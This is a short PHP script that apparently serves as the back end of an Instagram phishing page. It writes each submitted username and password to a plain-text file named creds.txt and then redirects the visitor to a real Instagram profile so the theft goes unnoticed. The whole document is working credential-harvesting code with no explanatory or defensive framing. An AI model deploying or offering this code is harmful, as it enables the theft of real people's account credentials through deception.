<?php
file_put_contents("creds.txt", "Username: " . $_POST['username'] . " | Password: " . $_POST['password'] . "\n", FILE_APPEND);
header("Location: https://www.instagram.com/yogeshmittalll/"); // Redirects to real site
exit();
?>
